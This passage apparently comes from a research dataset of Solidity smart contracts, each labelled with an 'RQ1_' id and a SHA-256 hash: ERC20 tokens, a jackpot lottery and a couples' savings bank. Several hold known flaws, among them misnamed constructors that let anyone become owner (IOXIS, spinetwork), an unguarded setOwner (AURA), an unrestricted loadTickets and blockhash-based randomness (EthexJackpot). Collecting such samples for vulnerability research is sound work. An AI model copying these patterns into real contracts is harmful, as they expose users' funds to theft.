    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_9b04bb6baa4b

SHA-256 `26aaf6b3d5f208e31ee8477d6cf363c970de9061ec0b3b69294ab6134af1ef2c`

```solidity
pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract IOXIS is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "IOXIS";
    string public constant symbol = "IOS";
    uint public constant decimals = 18;
uint256 public totalSupply = 10000000000e18;
uint256 public totalDistributed = 2000000000e18;
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
uint256 public value = 150000e18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function ioxis() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_b8449e28b73a

SHA-256 `cfd05ee5297133aca21ee6c12f71edf395b8543fd46d61b98d9ee72fd02db60a`

```solidity
pragma solidity ^0.4.19;
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract SafeMath {
  function safeMul(uint256 a, uint256 b) returns (uint256) {
    uint256 c = a * b;
    require(a == 0 || c / a == b);
    return c;
  }
  function safeSub(uint256 a, uint256 b) returns (uint256) {
    require(b <= a);
    return a - b;
  }
  function safeAdd(uint256 a, uint256 b) returns (uint256) {
    uint c = a + b;
    require(c >= a && c >= b);
    return c;
  }
}
contract Owned {
  address public owner;
  function Owned() {
    owner = msg.sender;
  }
  function setOwner(address _owner) returns (bool success) {
    owner = _owner;
    return true;
  }
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
}
contract AURA is SafeMath, Owned {
    bool public locked = true;
    string public name = "Aurora DAO";
    string public symbol = "AURA";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function AURA() public {
        totalSupply = 1000000000000000000000000000;
        balanceOf[msg.sender] = totalSupply;
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(!locked || msg.sender == owner);
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        require(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        require(!locked);
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function unlockToken() onlyOwner {
      locked = false;
    }
    bool public balancesUploaded = false;
    function uploadBalances(address[] recipients, uint256[] balances) onlyOwner {
      require(!balancesUploaded);
      uint256 sum = 0;
      for (uint256 i = 0; i < recipients.length; i++) {
        balanceOf[recipients[i]] = safeAdd(balanceOf[recipients[i]], balances[i]);
        sum = safeAdd(sum, balances[i]);
      }
      balanceOf[owner] = safeSub(balanceOf[owner], sum);
    }
    function lockBalances() onlyOwner {
      balancesUploaded = true;
    }
}
```

## RQ1_be5c3e642eb1

SHA-256 `1be01c0d2fbe175930749eb29864a9b95d5077d12fc9a77778b6ae935b277821`

```solidity
pragma solidity ^0.5.0;
contract EthexJackpot {
    mapping(uint256 => address payable) public tickets;
    uint256 public numberEnd;
    uint256 public firstNumber;
    uint256 public dailyAmount;
    uint256 public weeklyAmount;
    uint256 public monthlyAmount;
    uint256 public seasonalAmount;
    bool public dailyProcessed;
    bool public weeklyProcessed;
    bool public monthlyProcessed;
    bool public seasonalProcessed;
    address payable private owner;
    address public lotoAddress;
    address payable public newVersionAddress;
    EthexJackpot previousContract;
    uint256 public dailyNumberStartPrev;
    uint256 public weeklyNumberStartPrev;
    uint256 public monthlyNumberStartPrev;
    uint256 public seasonalNumberStartPrev;
    uint256 public dailyStart;
    uint256 public weeklyStart;
    uint256 public monthlyStart;
    uint256 public seasonalStart;
    uint256 public dailyEnd;
    uint256 public weeklyEnd;
    uint256 public monthlyEnd;
    uint256 public seasonalEnd;
    uint256 public dailyNumberStart;
    uint256 public weeklyNumberStart;
    uint256 public monthlyNumberStart;
    uint256 public seasonalNumberStart;
    uint256 public dailyNumberEndPrev;
    uint256 public weeklyNumberEndPrev;
    uint256 public monthlyNumberEndPrev;
    uint256 public seasonalNumberEndPrev;
    event Jackpot (
        uint256 number,
        uint256 count,
        uint256 amount,
        byte jackpotType
    );
    event Ticket (
        bytes16 indexed id,
        uint256 number
    );
    event SuperPrize (
        uint256 amount,
        address winner
    );
    uint256 constant DAILY = 5000;
    uint256 constant WEEKLY = 35000;
    uint256 constant MONTHLY = 150000;
    uint256 constant SEASONAL = 450000;
    uint256 constant PRECISION = 1 ether;
    uint256 constant DAILY_PART = 84;
    uint256 constant WEEKLY_PART = 12;
    uint256 constant MONTHLY_PART = 3;
    constructor() public payable {
        owner = msg.sender;
    }
    function() external payable { }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    modifier onlyOwnerOrNewVersion {
        require(msg.sender == owner || msg.sender == newVersionAddress);
        _;
    }
    modifier onlyLoto {
        require(msg.sender == lotoAddress, "Loto only");
        _;
    }
    function migrate() external onlyOwnerOrNewVersion {
        newVersionAddress.transfer(address(this).balance);
    }
    function registerTicket(bytes16 id, address payable gamer) external onlyLoto {
        uint256 number = numberEnd + 1;
        if (block.number >= dailyEnd) {
            setDaily();
            dailyNumberStart = number;
        }
        else
            if (dailyNumberStart == dailyNumberStartPrev)
                dailyNumberStart = number;
        if (block.number >= weeklyEnd) {
            setWeekly();
            weeklyNumberStart = number;
        }
        else
            if (weeklyNumberStart == weeklyNumberStartPrev)
                weeklyNumberStart = number;
        if (block.number >= monthlyEnd) {
            setMonthly();
            monthlyNumberStart = number;
        }
        else
            if (monthlyNumberStart == monthlyNumberStartPrev)
                monthlyNumberStart = number;
        if (block.number >= seasonalEnd) {
            setSeasonal();
            seasonalNumberStart = number;
        }
        else
            if (seasonalNumberStart == seasonalNumberStartPrev)
                seasonalNumberStart = number;
        numberEnd = number;
        tickets[number] = gamer;
        emit Ticket(id, number);
    }
    function setLoto(address loto) external onlyOwner {
        lotoAddress = loto;
    }
    function setNewVersion(address payable newVersion) external onlyOwner {
        newVersionAddress = newVersion;
    }
    function payIn() external payable {
        uint256 distributedAmount = dailyAmount + weeklyAmount + monthlyAmount + seasonalAmount;
        if (distributedAmount < address(this).balance) {
            uint256 amount = (address(this).balance - distributedAmount) / 4;
            dailyAmount += amount;
            weeklyAmount += amount;
            monthlyAmount += amount;
            seasonalAmount += amount;
        }
    }
    function settleJackpot() external {
        if (block.number >= dailyEnd)
            setDaily();
        if (block.number >= weeklyEnd)
            setWeekly();
        if (block.number >= monthlyEnd)
            setMonthly();
        if (block.number >= seasonalEnd)
            setSeasonal();
        if (block.number == dailyStart || (dailyStart < block.number - 256))
            return;
        uint48 modulo = uint48(bytes6(blockhash(dailyStart) << 29));
        uint256 dailyPayAmount;
        uint256 weeklyPayAmount;
        uint256 monthlyPayAmount;
        uint256 seasonalPayAmount;
        uint256 dailyWin;
        uint256 weeklyWin;
        uint256 monthlyWin;
        uint256 seasonalWin;
        if (dailyProcessed == false) {
            dailyPayAmount = dailyAmount * PRECISION / DAILY_PART / PRECISION;
            dailyAmount -= dailyPayAmount;
            dailyProcessed = true;
            dailyWin = getNumber(dailyNumberStartPrev, dailyNumberEndPrev, modulo);
            emit Jackpot(dailyWin, dailyNumberEndPrev - dailyNumberStartPrev + 1, dailyPayAmount, 0x01);
        }
        if (weeklyProcessed == false) {
            weeklyPayAmount = weeklyAmount * PRECISION / WEEKLY_PART / PRECISION;
            weeklyAmount -= weeklyPayAmount;
            weeklyProcessed = true;
            weeklyWin = getNumber(weeklyNumberStartPrev, weeklyNumberEndPrev, modulo);
            emit Jackpot(weeklyWin, weeklyNumberEndPrev - weeklyNumberStartPrev + 1, weeklyPayAmount, 0x02);
        }
        if (monthlyProcessed == false) {
            monthlyPayAmount = monthlyAmount * PRECISION / MONTHLY_PART / PRECISION;
            monthlyAmount -= monthlyPayAmount;
            monthlyProcessed = true;
            monthlyWin = getNumber(monthlyNumberStartPrev, monthlyNumberEndPrev, modulo);
            emit Jackpot(monthlyWin, monthlyNumberEndPrev - monthlyNumberStartPrev + 1, monthlyPayAmount, 0x04);
        }
        if (seasonalProcessed == false) {
            seasonalPayAmount = seasonalAmount;
            seasonalAmount -= seasonalPayAmount;
            seasonalProcessed = true;
            seasonalWin = getNumber(seasonalNumberStartPrev, seasonalNumberEndPrev, modulo);
            emit Jackpot(seasonalWin, seasonalNumberEndPrev - seasonalNumberStartPrev + 1, seasonalPayAmount, 0x08);
        }
        if (dailyPayAmount > 0)
            getAddress(dailyWin).transfer(dailyPayAmount);
        if (weeklyPayAmount > 0)
            getAddress(weeklyWin).transfer(weeklyPayAmount);
        if (monthlyPayAmount > 0)
            getAddress(monthlyWin).transfer(monthlyPayAmount);
        if (seasonalPayAmount > 0)
            getAddress(seasonalWin).transfer(seasonalPayAmount);
    }
    function paySuperPrize(address payable winner) external onlyLoto {
        uint256 superPrizeAmount = dailyAmount + weeklyAmount + monthlyAmount + seasonalAmount;
        emit SuperPrize(superPrizeAmount, winner);
        winner.transfer(superPrizeAmount);
    }
    function loadTickets(address payable[] calldata addresses, uint256[] calldata numbers) external {
        for (uint i = 0; i < addresses.length; i++)
            tickets[numbers[i]] = addresses[i];
    }
    function setOldVersion(address payable oldAddress) external onlyOwner {
        previousContract = EthexJackpot(oldAddress);
        dailyStart = previousContract.dailyStart();
        dailyEnd = previousContract.dailyEnd();
        dailyProcessed = previousContract.dailyProcessed();
        weeklyStart = previousContract.weeklyStart();
        weeklyEnd = previousContract.weeklyEnd();
        weeklyProcessed = previousContract.weeklyProcessed();
        monthlyStart = previousContract.monthlyStart();
        monthlyEnd = previousContract.monthlyEnd();
        monthlyProcessed = previousContract.monthlyProcessed();
        seasonalStart = previousContract.seasonalStart();
        seasonalEnd = previousContract.seasonalEnd();
        seasonalProcessed = previousContract.seasonalProcessed();
        dailyNumberStartPrev = previousContract.dailyNumberStartPrev();
        weeklyNumberStartPrev = previousContract.weeklyNumberStartPrev();
        monthlyNumberStartPrev = previousContract.monthlyNumberStartPrev();
        seasonalNumberStartPrev = previousContract.seasonalNumberStartPrev();
        dailyNumberStart = previousContract.dailyNumberStart();
        weeklyNumberStart = previousContract.weeklyNumberStart();
        monthlyNumberStart = previousContract.monthlyNumberStart();
        seasonalNumberStart = previousContract.seasonalNumberStart();
        dailyNumberEndPrev = previousContract.dailyNumberEndPrev();
        weeklyNumberEndPrev = previousContract.weeklyNumberEndPrev();
        monthlyNumberEndPrev = previousContract.monthlyNumberEndPrev();
        seasonalNumberEndPrev = previousContract.seasonalNumberEndPrev();
        numberEnd = previousContract.numberEnd();
        dailyAmount = previousContract.dailyAmount();
        weeklyAmount = previousContract.weeklyAmount();
        monthlyAmount = previousContract.monthlyAmount();
        seasonalAmount = previousContract.seasonalAmount();
        firstNumber = numberEnd;
        previousContract.migrate();
    }
    function getAddress(uint256 number) public returns (address payable) {
        if (number <= firstNumber)
            return previousContract.getAddress(number);
        return tickets[number];
    }
    function setDaily() private {
        dailyProcessed = dailyNumberEndPrev == numberEnd;
        dailyStart = dailyEnd;
        dailyEnd = dailyStart + DAILY;
        dailyNumberStartPrev = dailyNumberStart;
        dailyNumberEndPrev = numberEnd;
    }
    function setWeekly() private {
        weeklyProcessed = weeklyNumberEndPrev == numberEnd;
        weeklyStart = weeklyEnd;
        weeklyEnd = weeklyStart + WEEKLY;
        weeklyNumberStartPrev = weeklyNumberStart;
        weeklyNumberEndPrev = numberEnd;
    }
    function setMonthly() private {
        monthlyProcessed = monthlyNumberEndPrev == numberEnd;
        monthlyStart = monthlyEnd;
        monthlyEnd = monthlyStart + MONTHLY;
        monthlyNumberStartPrev = monthlyNumberStart;
        monthlyNumberEndPrev = numberEnd;
    }
    function setSeasonal() private {
        seasonalProcessed = seasonalNumberEndPrev == numberEnd;
        seasonalStart = seasonalEnd;
        seasonalEnd = seasonalStart + SEASONAL;
        seasonalNumberStartPrev = seasonalNumberStart;
        seasonalNumberEndPrev = numberEnd;
    }
    function getNumber(uint256 startNumber, uint256 endNumber, uint48 modulo) pure private returns (uint256) {
        return startNumber + modulo % (endNumber - startNumber + 1);
    }
}
```

## RQ1_579c10166d84

SHA-256 `84ce64553a5ab5412b6144cc1339fac85c2f8f8174a99cd447e1f799b1480885`

```solidity
pragma solidity ^0.4.17;
contract LoveBankAccessControl {
    event ContractUpgrade(address newVerseContract);
    address public ceoAddress;
    address public cfoAddress;
    address public cooAddress;
    bool public paused=false;
    modifier onlyCEO() {
        require(msg.sender == ceoAddress);
        _;
    }
    modifier onlyCFO() {
        require(msg.sender == cfoAddress);
        _;
    }
    modifier onlyCOO() {
        require(msg.sender == cooAddress);
        _;
    }
    modifier onlyCLevel() {
        require(
            msg.sender == cooAddress ||
            msg.sender == ceoAddress ||
            msg.sender == cfoAddress
        );
        _;
    }
    function setCEO(address _newCEO) external onlyCEO {
        require(_newCEO != address(0));
        ceoAddress = _newCEO;
    }
    function setCFO(address _newCFO) external onlyCEO {
        require(_newCFO != address(0));
        cfoAddress = _newCFO;
    }
    function setCOO(address _newCOO) external onlyCEO {
        require(_newCOO != address(0));
        cooAddress = _newCOO;
    }
    modifier whenNotPaused() {
        require(!paused);
        _;
    }
    modifier whenPaused() {
        require(paused);
        _;
    }
    function pause() external onlyCLevel whenNotPaused {
        paused = true;
    }
    function unpause() public onlyCEO whenPaused {
        paused = false;
    }
}
contract LoveAccountBase{
    event Deposit(address _from, uint _value);
    enum Status{BreakUp, Active, RequestPending, FirstMet,  
        FirstKiss, FirstConfess, InRelationship,FirstDate, 
        Proposal, Engage, WeddingDay, Anniversary, Trip,  
        NewFamilyMember, FirstSex, Birthday,             
        special1, special2, special3                  
    }
    struct StonePage {
    	uint64 logtime;
    	Status contant;
    }
    struct DiaryPage {
    	uint64 logtime;
    	bytes contant;
    }
    bytes32 public name1;
    bytes32 public name2;
    address public owner1;
    address public owner2;
    address BANKACCOUNT;
    address withdrawer;
    uint256 request_amount;
    uint256 request_fee;
    uint64 public loveID;
    uint64 public foundTime=uint64(now);
    uint64 public next_diary_id=0;
    uint64 public next_stone_id=0;
    Status public status=Status.Active;
    mapping (uint64=>StonePage) public milestone;
    mapping (uint64=>DiaryPage) public diary;
    function LoveAccountBase (
        bytes32 _name1,
        bytes32 _name2,
        address _address1,
        address _address2,
        uint64 _loveID) public {
            name1 = _name1;
            name2 = _name2;
            owner1 = _address1;
            owner2 = _address2;
            loveID = _loveID;
            BANKACCOUNT = msg.sender;
    }
    modifier notBreakup() {require(uint(status)!=0);_;}
    modifier oneOfOwners(address _address) {
        require (_address==owner1 || _address==owner2);_;
    }
    modifier callByBank() {require(msg.sender == BANKACCOUNT);_;}
    function changeBankAccount(address newBank) external callByBank{
        require(newBank!=address(0));
        BANKACCOUNT = newBank;
    }
    function breakup(
        address _breaker, uint256 _fee) external payable 
        notBreakup oneOfOwners(_breaker) callByBank{
        if(_fee!=0){BankCore(BANKACCOUNT).receiveFee.value(_fee)();}
        if(_breaker==owner1) {owner2.transfer(this.balance);}
        if(_breaker==owner2) {owner1.transfer(this.balance);}
        status=Status.BreakUp;
    }
    function withdraw(uint256 amount, 
        address _to, uint256 _fee) external notBreakup oneOfOwners(_to) callByBank{
        require(this.balance>=amount);
        status =Status.RequestPending;
        request_amount = amount;
        withdrawer = _to;
        request_fee = _fee;
    }
    function withdrawConfirm(
        uint256 _amount, 
        address _confirmer) external payable notBreakup oneOfOwners(_confirmer) callByBank{
        require(uint(status)==2);
        require(_amount==request_amount);
        require(_confirmer!=withdrawer);
        require(this.balance>=request_amount);
        if(request_fee!=0){BankCore(BANKACCOUNT).receiveFee.value(request_fee)();}
        withdrawer.transfer(request_amount-request_fee);
        status=Status.Active;
        withdrawer=address(0);
        request_amount=0;
        request_fee=0;
    }
    function mileStone(address _sender, uint64 _time, uint8 _choice) external notBreakup oneOfOwners(_sender) callByBank {
        milestone[next_stone_id]=StonePage({
        	logtime: _time,
        	contant: Status(_choice)
        });
        next_stone_id++;
    }
    function Diary(address _sender, bytes _diary) external notBreakup oneOfOwners(_sender) callByBank {
        diary[next_diary_id]=DiaryPage({
        	logtime: uint64(now),
        	contant: _diary
        });
        next_diary_id++;  
    }
    function() external payable notBreakup {
        require(msg.value>0);
        Deposit(msg.sender, msg.value);
    }
}
contract Bank is LoveBankAccessControl{
    event Create(bytes32 _name1, bytes32 _name2, address _conadd, 
                address _address1, address _address2, uint64 _loveID);
    event Breakup(uint _time);
    event StoneLog(uint _time, uint _choice);
    event DiaryLog(uint _time, bytes _contant);
    event Withdraw(uint _amount, uint _endTime);
    event WithdrawConfirm(uint _amount, uint _confirmTime);
    struct pending {
        bool pending;
        address withdrawer;
        uint256 amount;
        uint256 fee;
        uint64 endTime;
    }
    uint256 STONE_FEE=4000000000000000;
    uint256 OPEN_FEE=20000000000000000;
    uint64 FREE_START=0;
    uint64 FREE_END=0;
    uint64 WD_FEE_VERSE=100;  
    uint64 BU_FEE_VERSE=50;   
    uint32 public CONFIRM_LIMIT = 900; 
    uint64 public next_id=0; 
    mapping (bytes16 => address)  public sig_to_add;
    mapping (address => pending) public pendingList;
    function createAccount(
        bytes32 name1,
        bytes32 name2,
        address address1,
        address address2) external payable whenNotPaused {
        uint fee;
        if (_ifFree()){fee=0;} else{fee=OPEN_FEE;}
        require(msg.sender==address1   &&
                address1!=address2     && 
                address1!=address(0)   &&
                address2!=address(0)   &&
                msg.value>=fee);
        require(_ifFree() || msg.value >= OPEN_FEE);
        bytes16 sig = bytes16(keccak256(address1))^bytes16(keccak256(address2));
        require(sig_to_add[sig]==0);
        address newContract = (new LoveAccountBase)(name1, name2, address1, address2, next_id);
        sig_to_add[sig]=newContract;
        Create(name1, name2, newContract, address1, address2, next_id);
        if(msg.value>fee){
            newContract.transfer(msg.value-fee);
        }
        next_id++;
    }
    function _calculate(uint256 _amount, uint _dev) internal pure returns(uint256 _int){
        _int = _amount/uint256(_dev);
    }
    function _ifFree() view internal returns(bool) {
        if(uint64(now)<FREE_START || uint64(now)>FREE_END
            ) {return false;
        } else {return true;}
    }
    function sendBreakup(address _conadd) external whenNotPaused {
        if (_ifFree()){
            LoveAccountBase(_conadd).breakup(msg.sender,0);}
        else{
            uint _balance = _conadd.balance;
            uint _fee = _calculate(_balance, BU_FEE_VERSE);
            LoveAccountBase(_conadd).breakup(msg.sender,_fee);}
        Breakup(now);
     }
    function sendMileStone(
        address _conadd, uint _time, 
        uint _choice) external payable whenNotPaused {
        require(msg.value >= STONE_FEE);
        uint8 _choice8 = uint8(_choice);
        require(_choice8>2 && _choice8<=18);
        LoveAccountBase(_conadd).mileStone(msg.sender, uint64(_time), _choice8);
        StoneLog(_time, _choice8);
    }
    function sendDiary(address _conadd, bytes _diary) external whenNotPaused{
        LoveAccountBase(_conadd).Diary(msg.sender, _diary);
        DiaryLog(now, _diary);
    }
    function bankWithdraw(address _conadd, uint _amount) external whenNotPaused{
        require(!pendingList[_conadd].pending || now>pendingList[_conadd].endTime);
        uint256 _fee;
        uint256 _amount256 = uint256(_amount); 
        require(_amount256==_amount);
        if (_ifFree()){_fee=0;}else{_fee=_calculate(_amount, WD_FEE_VERSE);}
        LoveAccountBase _conA = LoveAccountBase(_conadd);
        _conA.withdraw(_amount, msg.sender, _fee);
        uint64 _end = uint64(now)+CONFIRM_LIMIT;
        pendingList[_conadd] = pending({
                    pending:true,
                    withdrawer:msg.sender,
                    amount: _amount256,
                    fee:_fee,
                    endTime: _end});
        Withdraw(_amount256, _end);
    }
    function bankConfirm(address _conadd, uint _amount) external whenNotPaused{
        uint256 _amount256 = uint256(_amount); 
        require(_amount256==_amount);
        require(pendingList[_conadd].pending && now<pendingList[_conadd].endTime);
        require(pendingList[_conadd].withdrawer != msg.sender);
        require(pendingList[_conadd].amount == _amount);
        LoveAccountBase(_conadd).withdrawConfirm(_amount, msg.sender);
        delete pendingList[_conadd];
        WithdrawConfirm(_amount, now);
    }
}
contract LovePromo is Bank{
    function setFreeTime(uint _start, uint _end) external onlyCOO {
        require(_end>=_start && _start>uint64(now));
        FREE_START = uint64(_start);
        FREE_END = uint64(_end);
    }
    function setFee(
        uint _withdrawFee, 
        uint _breakupFee, 
        uint _stone, 
        uint _open) external onlyCEO {
        require(_withdrawFee>=100);
        require(_breakupFee>=50);
        WD_FEE_VERSE = uint64(_withdrawFee);
        BU_FEE_VERSE = uint64(_breakupFee);
        STONE_FEE = _stone;
        OPEN_FEE = _open;
    }
    function setConfirm(uint _newlimit) external onlyCEO {
        CONFIRM_LIMIT = uint32(_newlimit);
    }
    function getFreeTime() external view onlyCLevel returns(uint64 _start, uint64 _end){
        _start = uint64(FREE_START);
        _end = uint64(FREE_END);
    }
    function getFee() external view onlyCLevel returns(
        uint64 _withdrawFee, 
        uint64 _breakupFee, 
        uint _stone, 
        uint _open){
        _withdrawFee = WD_FEE_VERSE;
        _breakupFee = BU_FEE_VERSE;
        _stone = STONE_FEE;
        _open = OPEN_FEE;
    }
}
contract BankCore is LovePromo {
    address public newContractAddress;
    event DepositBank(address _sender, uint _value);
    function BankCore() public {
        paused = true;
        ceoAddress = msg.sender;
        cooAddress = msg.sender;
        cfoAddress = msg.sender;
    }
    function setNewAddress(address _v2Address) external onlyCEO whenPaused {
        newContractAddress = _v2Address;
        ContractUpgrade(_v2Address);
    }
    function unpause() public onlyCEO whenPaused {
        require(newContractAddress == address(0));
        super.unpause();
    }
    function changeBank(address _conadd, address newBank) external whenPaused onlyCEO{
        require(newBank != address(0));
        LoveAccountBase(_conadd).changeBankAccount(newBank);
    }
    function withdrawBalance() external onlyCFO {
        if (this.balance > 0) {
            cfoAddress.transfer(this.balance);
        }
    }
    function getContract(address _add1, address _add2) external view returns(address){
        bytes16 _sig = bytes16(keccak256(_add1))^bytes16(keccak256(_add2));
        return sig_to_add[_sig];
    }
    function receiveFee() external payable{}
    function() external payable onlyCLevel {
        require(msg.value>0);
        DepositBank(msg.sender, msg.value);
    }
}
```

## RQ1_116d8aeb4b40

SHA-256 `78480600877ec191188400fc161dd12795180c370e1b6a40baae26181c4e18cd`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract AltcoinToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract spinetwork is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "Simple Payment Instant Token";
    string public constant symbol = "SPIT";
    uint public constant decimals = 8;
    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed = 0;        
    uint256 public tokensPerEth = 20000000e8;
    uint256 public constant minContribution = 1 ether / 100; 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function spitoken () public {
        owner = msg.sender;
        uint256 devTokens = 1000000000e8;
        distr(owner, devTokens);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
